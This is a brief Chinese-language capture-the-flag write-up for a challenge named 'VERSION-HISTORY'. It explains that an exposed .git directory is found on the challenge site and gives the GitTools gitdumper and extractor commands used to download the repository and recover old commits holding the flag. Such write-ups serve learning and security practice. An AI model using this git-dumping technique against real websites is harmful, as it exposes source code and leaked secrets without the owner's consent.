# VERSION-HISTORY

## 解題思路

這個網站給的提示就是和git有關，所以去檢查.git資料夾是否有被放出來，結果確實是有的。

> 檢查 `https://version-history-web.2025-bq.ctfcompetition.com/.git/HEAD`
>
> 得到: `ref: refs/heads/main`

再加上網站內提到，他原先有不小心把紀錄推上來，只有單純用新的commit蓋掉，所以我們可以嘗試去翻紀錄，理論上會有舊的code殘留，從中找Flag。

這時候就用到 [GitTools](https://github.com/internetwache/GitTools)

先用dumper把git的資料都拉下來:

```sh
bash ./gitdumper.sh https://version-history-web.2025-bq.ctfcompetition.com/.git/ ./
```

然後再用extractor拆資料:

```sh
bash extractor.sh ./ ./inspect/
```

最後裡面就能得到Flag

## 參考資料

- [GitTools](https://github.com/internetwache/GitTools)
